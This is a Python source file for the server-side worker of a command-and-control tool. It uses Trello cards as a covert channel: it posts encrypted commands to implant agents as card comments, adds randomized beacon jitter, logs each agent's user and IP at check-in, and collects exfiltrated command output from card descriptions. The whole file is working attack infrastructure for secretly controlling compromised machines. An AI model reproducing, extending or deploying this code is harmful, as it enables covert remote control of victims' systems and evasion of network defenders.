from libs.db_utils import *
from libs.trello_api import *
from libs.data_format import *
import base64
import json
import time


class Worker:

    def __init__(self,password:str,trello_api_key:str,trello_token:str,trello_dashboard:str):
        self.db_connector = SqliteConnector("./database/database.db")
        self.trello_api = TrelloAPI(trello_api_key,trello_token,trello_dashboard)
        self.password = password
        self.active = True
        self.server_refresh_rate = 20

    def randomize_jitter(self)->float:
        return self.server_refresh_rate+(random.randint(1,99)/100)*self.server_refresh_rate

    def send_next_command_for_agent(self,agent_id:str):
        for task in self.db_connector.get_tasks_for_agent_queued(agent_id):
            #print(task)
            if base64.b64decode(task[2]).decode()!="checkin":
                encrypted_command = format_command_to_send(task[2],task[0],self.randomize_jitter(),self.password,"implented")
                self.db_connector.pass_task_in_progress(task[0])
                self.trello_api.post_comment_on_card(agent_id,encrypted_command)
                break
            else:
                encrypted_command = format_command_to_send(task[2],task[0],self.randomize_jitter(),self.password,"initial")
                self.db_connector.pass_task_in_progress(task[0])
                self.trello_api.post_comment_on_card(agent_id,encrypted_command)
                break
    
    def set_output_for_task(self,task_id:str,payload:str):
        if self.db_connector.get_command_by_id(task_id) == "checkin":
            #print("its checkin")
            self.db_connector.set_user_and_ip(task_id,payload)
            return self.db_connector.set_output_for_task_id(task_id,payload)
        else:
            return self.db_connector.set_output_for_task_id(task_id,payload)

    def check_for_output_and_push_queues(self):
        decoded = None
        all_cards = self.trello_api.get_cards_by_name_contains("tache-")
        all_cards_dict = {card["name"]:card["desc"] for card in all_cards}
        for card in all_cards:
            agent_id = card["shortLink"]
            description = card["desc"]
            #print("Len description : ",len(description))
            try:
                decoded = json.loads(base64.b64decode(description.encode()).decode())
                #print(decoded)
            except:
                for subkey in list(filter(re.compile(rf"^{card['name']}-[0-9]+$").match,list(all_cards_dict.keys()))):
                    part = all_cards_dict[subkey]
                    description += part
                    try:
                        decoded = json.loads(base64.b64decode(description.encode()).decode())
                        break
                    except:
                        pass
                #print(decoded)
                if not decoded:
                    decoded = {"type":"error"}
            if decoded["type"]=="output":
                payload = decoded["payload"]
                try:
                    decrypted_payload = decrypt_blob(self.password,payload,decoded["nonce"])
                except Exception as error:
                    decrypted_payload = {}
                
                self.set_output_for_task(decrypted_payload["id"],decrypted_payload["payload"])
                self.db_connector.pass_task_done(decrypted_payload["id"])
                self.send_next_command_for_agent(agent_id)
            elif decoded["type"]=="error":
                if description == "":
                    self.send_next_command_for_agent(agent_id)


    def run_loop(self):
        while self.active:
            self.check_for_output_and_push_queues()
            for _ in range(30):
                time.sleep(1)
                if not self.active:

                    break
